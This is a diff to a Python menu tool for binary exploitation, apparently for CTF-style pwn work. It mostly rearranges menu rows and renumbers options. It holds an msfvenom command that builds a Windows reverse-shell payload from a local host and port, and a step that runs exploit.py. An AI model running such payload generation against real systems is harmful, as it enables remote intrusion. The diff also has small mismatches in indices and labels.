@@ -1,3 +1,4 @@
+# BINARY MASTER
 #!/usr/bin/python3
 # coding:UTF-8
 
@@ -344,128 +345,8 @@ def dispMenu():
    return
    
 def options():
-   print('\u2551' + "(01) ACCUMULATOR  (11) START  ADDRESS (21) PUTS@PLT ADDRESS (31) ExtractGadgets (41) MSF PatternCreate (51) Hexcode Editor" + '\u2551',end=' ')
-   if "main" in FUNC[13]:
-      print(colored(FUNC[13],colour3), end=' ')
-   else:
-      print(colored(FUNC[13],colour6), end=' ')      
-   print('\u2551' + " ", end='')
-   print(colored(GADG[13] + " ", colour6), end='')
-   print('\u2551' + " " , end='')
-   print(colored(CODE[13] + " " , colour5, attrs=['bold']), end='')   
-   print('\u2551')
-# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(02) BASE         (12) MAIN   ADDRESS (22) PUTS@GOT ADDRESS (32) Read  PrivHead (42) Program Interface (52) SecComp   Dump" + '\u2551',end=' ')
-   if "main" in FUNC[14]:
-      print(colored(FUNC[14],colour3), end=' ')
-   else:
-      print(colored(FUNC[14],colour6), end=' ')  
-   print('\u2551' + " ", end='')
-   print(colored(GADG[14] + " ", colour6), end='')
-   print('\u2551' + " " , end='')
-   print(colored(CODE[14] + " " , colour5, attrs=['bold']), end='')   
-   print('\u2551')
-# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(03) COUNTER      (13) SYSTEM ADDRESS (23) POP RDI  ADDRESS (33) Read  Sections (43) L-Trace Interface (53) Use ShellCraft" + '\u2551',end=' ')
-   if "main" in FUNC[15]:
-      print(colored(FUNC[15],colour3), end=' ')
-   else:
-      print(colored(FUNC[15],colour6), end=' ')     
-   print('\u2551' + " ", end='')
-   print(colored(GADG[15] + " ", colour6), end='')
-   print('\u2551' + " " , end='')
-   print(colored(CODE[15] + " " , colour5, attrs=['bold']), end='')      
-   print('\u2551')
-# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- - 
-   print('\u2551' + "(04) DATA         (14) FUNCTION  ADDR (24) LIBC     ADDRESS (34) Read   Headers (44) G.D.B.  Interface (54) NASM Shellcode" + '\u2551', end=' ')
-   if "main" in FUNC[16]:
-      print(colored(FUNC[16],colour3), end=' ')
-   else:
-      print(colored(FUNC[16],colour6), end=' ')
-   print('\u2551' + " ", end='')
-   print(colored(GADG[16] + " ", colour6), end='')
-   print('\u2551' + " " , end='')
-   print(colored(CODE[16] + " " , colour5, attrs=['bold']), end='')
-   print('\u2551')
-# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(05) SOURCE INDEX (15) OVERWRITE ADDR (25) Select  FILENAME (35) ReadExecutable (45) MSF PatternSearch (55) MSF  Shellcode" + '\u2551',end=' ')
-   if "main" in FUNC[17]:
-      print(colored(FUNC[17],colour3), end=' ')
-   else:
-      print(colored(FUNC[17],colour6), end=' ')     
-   print('\u2551' + " ", end='')
-   print(colored(GADG[17] + " ", colour6), end='')
-   print('\u2551' + " " , end='')
-   print(colored(CODE[17] + " " , colour5, attrs=['bold']), end='')
-   print('\u2551')
-   # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- - 
-   print('\u2551' + "(06) DESTIN INDEX (16) MEMORY    ADDR (26) Switch File Mode (36) Read DeBugInfo (46) Set Buffer OFFSET (56) RESERVED      " + '\u2551',end=' ')
-   if "main" in FUNC[18]:
-      print(colored(FUNC[18],colour3), end=' ')
-   else:
-      print(colored(FUNC[18],colour6), end=' ')     
-   print('\u2551' + " ", end='')
-   print(colored(GADG[18] + " ", colour6), end='')
-   print('\u2551' + " " , end='')
-   print(colored(CODE[18] + " " , colour5, attrs=['bold']), end='')
-   print('\u2551')
-# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(07) STACKPOINTER (17) POINTER   ADDR (27) Examine  Program (37) Read Assembley (47) Adjust the OFFSET (57) Set IP &  Port" + '\u2551',end=' ')
-   if "main" in FUNC[19]:
-      print(colored(FUNC[19],colour3), end=' ')
-   else:
-      print(colored(FUNC[19],colour6), end=' ')     
-   print('\u2551' + " ", end='')
-   print(colored(GADG[19] + " ", colour6), end='')
-   print('\u2551' + " " , end='')
-   print(colored(CODE[19] + " " , colour5, attrs=['bold']), end='')
-   print('\u2551')
-# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(08) BASE POINTER (18) CUSTOM-1  ADDR (28) CheckSec Program (38) Read   Symbols (48) Dis-Assemble MAIN (58) Exploit Binary" + '\u2551',end=' ')
-   if "main" in FUNC[20]:
-      print(colored(FUNC[20],colour3), end=' ')
-   else:
-      print(colored(FUNC[20],colour6), end=' ')     
-   print('\u2551' + " ", end='')
-   print(colored(GADG[20] + " ", colour6), end='')
-   print('\u2551' + " " , end='')
-   print(colored(CODE[20] + " " , colour5, attrs=['bold']), end='')
-   print('\u2551')
-# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(09) INST POINTER (19) CUSTOM-2  ADDR (29) G.D.B. Functions (39) Read Stab Data (49) Dis-Assemble FUNC (59) Read OP Manual" + '\u2551',end=' ')
-   if "main" in FUNC[21]:
-      print(colored(FUNC[21],colour3), end=' ')
-   else:
-      print(colored(FUNC[21],colour6), end=' ')     
-   print('\u2551' + " ", end='')
-   print(colored(GADG[21] + " ", colour6), end='')
-   print('\u2551' + " " , end='')
-   print(colored(CODE[21] + " " , colour5, attrs=['bold']), end='')
-   print('\u2551')
-# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -     
-   print('\u2551' + "(10) PIE  ADDRESS (20) CUSTOM-3  ADDR (30) Radar2 Functions (40) Read HexFormat (50) Dis-Assemble ADDR (60) Exit Program  " + '\u2551',end=' ')
-   if "main" in FUNC[22]:
-      print(colored(FUNC[22],colour3), end=' ')
-   else:
-      print(colored(FUNC[22],colour6), end=' ')   
-   print('\u2551' + " ", end='')
-   print(colored(GADG[22] + " ", colour6), end='')
-   print('\u2551' + " " , end='')
-   print(colored(CODE[22] + " " , colour5, attrs=['bold']), end='')
-   print('\u2551')
 
-   print('\u2560' + ('\u2550'*122) + '\u2563', end=' ')
-   if "main" in FUNC[23]:
-      print(colored(FUNC[23], colour3), end=' ')
-   else:
-      print(colored(FUNC[23], colour6), end=' ')
-   print('\u2551', end =' ')
-   print(colored(GADG[23], colour6), end=' ')
-   print('\u2551', end=' ')
-   print(colored(CODE[23], colour5, attrs=['bold']), end=' ')
-   print('\u2551')
-
-   for z in range(24, maxDispl-3):
+   for z in range(13, 23):
       print('\u2551', end='')
       print(colored("▉"*122, colour1),end='')
       print('\u2551', end=' ')
@@ -478,6 +359,154 @@ def options():
       print('\u2551', end=' ')
       print(colored(CODE[z], colour5, attrs=['bold']), end=' ')
       print('\u2551')
+      
+      
+   print('\u2560' + ('\u2550'*122) + '\u2563', end=' ')
+   if "main" in FUNC[23]:
+      print(colored(FUNC[23], colour3), end=' ')
+   else:
+      print(colored(FUNC[23], colour6), end=' ')
+   print('\u2551', end =' ')
+   print(colored(GADG[23], colour6), end=' ')
+   print('\u2551', end=' ')
+   print(colored(CODE[23], colour5, attrs=['bold']), end=' ')
+   print('\u2551')
+
+#24
+   print('\u2551' + "(01) ACCUMULATOR  (11) START  ADDRESS (21) PUTS@PLT ADDRESS (31) ExtractGadgets (41) MSF PatternCreate (51) Hexcode Editor" + '\u2551',end=' ')
+   if "main" in FUNC[24]:
+      print(colored(FUNC[24],colour3), end=' ')
+   else:
+      print(colored(FUNC[24],colour6), end=' ')      
+   print('\u2551' + " ", end='')
+   print(colored(GADG[24] + " ", colour6), end='')
+   print('\u2551' + " " , end='')
+   print(colored(CODE[24] + " " , colour5, attrs=['bold']), end='')   
+   print('\u2551')
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
+   print('\u2551' + "(02) BASE         (12) MAIN   ADDRESS (22) PUTS@GOT ADDRESS (32) Read  PrivHead (42) Program Interface (52) SecComp   Dump" + '\u2551',end=' ')
+   if "main" in FUNC[25]:
+      print(colored(FUNC[25],colour3), end=' ')
+   else:
+      print(colored(FUNC[25],colour6), end=' ')  
+   print('\u2551' + " ", end='')
+   print(colored(GADG[25] + " ", colour6), end='')
+   print('\u2551' + " " , end='')
+   print(colored(CODE[25] + " " , colour5, attrs=['bold']), end='')   
+   print('\u2551')
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
+   print('\u2551' + "(03) COUNTER      (13) SYSTEM ADDRESS (23) POP RDI  ADDRESS (33) Read  Sections (43) L-Trace Interface (53) Use ShellCraft" + '\u2551',end=' ')
+   if "main" in FUNC[26]:
+      print(colored(FUNC[26],colour3), end=' ')
+   else:
+      print(colored(FUNC[26],colour6), end=' ')     
+   print('\u2551' + " ", end='')
+   print(colored(GADG[26] + " ", colour6), end='')
+   print('\u2551' + " " , end='')
+   print(colored(CODE[26] + " " , colour5, attrs=['bold']), end='')      
+   print('\u2551')
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- - 
+   print('\u2551' + "(04) DATA         (14) FUNCTION  ADDR (24) LIBC     ADDRESS (34) Read   Headers (44) G.D.B.  Interface (54) NASM Shellcode" + '\u2551', end=' ')
+   if "main" in FUNC[27]:
+      print(colored(FUNC[27],colour3), end=' ')
+   else:
+      print(colored(FUNC[27],colour6), end=' ')
+   print('\u2551' + " ", end='')
+   print(colored(GADG[27] + " ", colour6), end='')
+   print('\u2551' + " " , end='')
+   print(colored(CODE[27] + " " , colour5, attrs=['bold']), end='')
+   print('\u2551')
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
+   print('\u2551' + "(05) SOURCE INDEX (15) OVERWRITE ADDR (25) Select  FILENAME (35) ReadExecutable (45) MSF PatternSearch (55) MSF  Shellcode" + '\u2551',end=' ')
+   if "main" in FUNC[17]:
+      print(colored(FUNC[28],colour3), end=' ')
+   else:
+      print(colored(FUNC[28],colour6), end=' ')     
+   print('\u2551' + " ", end='')
+   print(colored(GADG[28] + " ", colour6), end='')
+   print('\u2551' + " " , end='')
+   print(colored(CODE[28] + " " , colour5, attrs=['bold']), end='')
+   print('\u2551')
+   # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- - 
+   print('\u2551' + "(29) DESTIN INDEX (16) MEMORY    ADDR (26) Switch File Mode (36) Read DeBugInfo (46) Set Buffer OFFSET (56) Set IP & Port " + '\u2551',end=' ')
+   if "main" in FUNC[29]:
+      print(colored(FUNC[29],colour3), end=' ')
+   else:
+      print(colored(FUNC[29],colour6), end=' ')     
+   print('\u2551' + " ", end='')
+   print(colored(GADG[29] + " ", colour6), end='')
+   print('\u2551' + " " , end='')
+   print(colored(CODE[29] + " " , colour5, attrs=['bold']), end='')
+   print('\u2551')
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
+   print('\u2551' + "(07) STACKPOINTER (17) POINTER   ADDR (27) Examine  Program (37) Read Assembley (47) Adjust the OFFSET (57) Exploit Binary" + '\u2551',end=' ')
+   if "main" in FUNC[30]:
+      print(colored(FUNC[30],colour3), end=' ')
+   else:
+      print(colored(FUNC[30],colour6), end=' ')     
+   print('\u2551' + " ", end='')
+   print(colored(GADG[30] + " ", colour6), end='')
+   print('\u2551' + " " , end='')
+   print(colored(CODE[30] + " " , colour5, attrs=['bold']), end='')
+   print('\u2551')
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
+   print('\u2551' + "(08) BASE POINTER (18) CUSTOM-1  ADDR (28) CheckSec Program (38) Read   Symbols (48) Dis-Assemble MAIN (58) Edit PWN Code " + '\u2551',end=' ')
+   if "main" in FUNC[31]:
+      print(colored(FUNC[31],colour3), end=' ')
+   else:
+      print(colored(FUNC[31],colour6), end=' ')     
+   print('\u2551' + " ", end='')
+   print(colored(GADG[31] + " ", colour6), end='')
+   print('\u2551' + " " , end='')
+   print(colored(CODE[31] + " " , colour5, attrs=['bold']), end='')
+   print('\u2551')
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
+   print('\u2551' + "(09) INST POINTER (19) CUSTOM-2  ADDR (29) G.D.B. Functions (39) Read Stab Data (49) Dis-Assemble FUNC (59) Read OP Manual" + '\u2551',end=' ')
+   if "main" in FUNC[32]:
+      print(colored(FUNC[32],colour3), end=' ')
+   else:
+      print(colored(FUNC[32],colour6), end=' ')     
+   print('\u2551' + " ", end='')
+   print(colored(GADG[32] + " ", colour6), end='')
+   print('\u2551' + " " , end='')
+   print(colored(CODE[32] + " " , colour5, attrs=['bold']), end='')
+   print('\u2551')
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -     
+   print('\u2551' + "(10) PIE  ADDRESS (20) CUSTOM-3  ADDR (30) Radar2 Functions (40) Read HexFormat (50) Dis-Assemble ADDR (60) Exit Program  " + '\u2551',end=' ')
+   if "main" in FUNC[33]:
+      print(colored(FUNC[33],colour3), end=' ')
+   else:
+      print(colored(FUNC[33],colour6), end=' ')   
+   print('\u2551' + " ", end='')
+   print(colored(GADG[33] + " ", colour6), end='')
+   print('\u2551' + " " , end='')
+   print(colored(CODE[33] + " " , colour5, attrs=['bold']), end='')
+   print('\u2551')
+
+#   print('\u2560' + ('\u2550'*122) + '\u2563', end=' ')
+#   if "main" in FUNC[34]:
+#      print(colored(FUNC[34], colour3), end=' ')
+#   else:
+#      print(colored(FUNC[34], colour6), end=' ')
+#   print('\u2551', end =' ')
+#   print(colored(GADG[34], colour6), end=' ')
+#   print('\u2551', end=' ')
+#   print(colored(CODE[34], colour5, attrs=['bold']), end=' ')
+#   print('\u2551')
+
+#   for z in range(24, maxDispl-3):
+#      print('\u2551', end='')
+#      print(colored("▉"*122, colour1),end='')
+#      print('\u2551', end=' ')
+#      if "main" in FUNC[z]:
+#         print(colored(FUNC[z], colour3), end=' ')
+#      else:
+#         print(colored(FUNC[z], colour6), end=' ')
+#      print('\u2551', end =' ')
+#      print(colored(GADG[z], colour6), end=' ')
+#      print('\u2551', end=' ')
+#      print(colored(CODE[z], colour5, attrs=['bold']), end=' ')
+#      print('\u2551')
    
    print('\u255A' + ('\u2550')*122 + '\u2569' +  ('\u2550')*38 + '\u2569' + ('\u2550')*76 + '\u2569' + ('\u2550')*76 + '\u255D')
    
@@ -2186,23 +2215,8 @@ while True:
       else:
          command("msfvenom -p windows/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITGRAD=thread -f c -a x" + ARC[:2] + " > payload.tmp")
       catsFile("payload.tmp")
-      prompt()  
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Blank.
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '56':
-      if DATA[0][:7].upper() == "UNKNOWN":
-         print("[-] Filename not specified...")
-      else:
-         pass
       prompt() 
-      
+
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -2211,7 +2225,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '57':
+   if selection == '56':
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
@@ -2219,7 +2233,7 @@ while True:
          DATA[10] = spacePadding(DATA[10], COL1)
          DATA[11] = input("[?] Please enter remote port number: ")
          DATA[11] = spacePadding(DATA[11], COL1)
-      prompt()      
+      prompt()  
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2229,7 +2243,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '58':
+   if selection == '57':
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
@@ -2450,6 +2464,18 @@ while True:
          command("python3 exploit.py 2> error.tmp")
          os.chdir("..")
       prompt()                       
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : FULL STACK
+# Details : Menu option selected - Blank.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '58':
+      command("gedit " + localDir + "/exploit.py")
+      prompt()      
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
